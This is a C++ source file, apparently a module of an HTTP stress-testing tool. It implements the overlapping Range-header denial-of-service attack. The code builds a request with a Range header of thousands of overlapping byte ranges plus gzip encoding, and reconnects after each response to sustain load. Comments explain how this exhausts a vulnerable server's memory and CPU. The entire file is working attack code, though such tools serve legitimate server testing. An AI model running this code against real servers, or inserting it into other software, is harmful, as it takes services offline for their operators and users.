// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/range.hpp"

#include <cstddef>

#include "slowhttp/request.hpp"

namespace slowhttp {

int build_range_header(int start, int limit, std::string* out) {
  out->append("Range: bytes=0-");
  int count = 1;  // the leading "0-" spec
  const std::string s = std::to_string(start);
  for (int i = 0; i < limit; ++i) {
    out->append(",");
    out->append(s);
    out->append("-");
    out->append(std::to_string(i));
    ++count;
  }
  out->append(",");
  out->append(s);
  out->append("-");
  out->append(std::to_string(limit));
  ++count;
  out->append("\r\n");
  return count;
}

RangeAttack::RangeAttack(const Config& cfg) : cfg_(cfg) {
  request_ = build_request();
}

Action RangeAttack::on_connect(ConnId /*id*/) {
  // One complete request, sent at full speed. Nothing is held back.
  return Action::send(request_);
}

Action RangeAttack::on_timer(ConnId /*id*/) {
  // No dribble phase; if a timer ever fires there is nothing left to do here.
  return Action::idle();
}

Action RangeAttack::on_readable(ConnId /*id*/, const char* /*data*/,
                                std::size_t /*len*/) {
  // The server answered (or gave up). Cycle the connection and hit it again --
  // sustained pressure comes from request volume, bounded by -r, not from holding
  // any single connection open.
  return Action::reconnect();
}

std::string RangeAttack::build_request() {
  std::string req;
  req.reserve(static_cast<std::size_t>(cfg_.range_limit) * 12 + 256);
  req += RequestSpec::from(cfg_).serialize_http11();
  // The overlapping ranges are the attack. Built straight into the buffer
  // rather than through RequestSpec::set(), because this is one header whose
  // value is thousands of ranges long and is counted as it is written.
  range_count_ = build_range_header(cfg_.range_start, cfg_.range_limit, &req);
  // gzip is part of the original exploit: compressing each overlapping range
  // separately is where a vulnerable server burns memory and CPU.
  req += "Accept-Encoding: gzip\r\n";
  req += "Connection: close\r\n";
  req += "\r\n";
  return req;
}

}  // namespace slowhttp
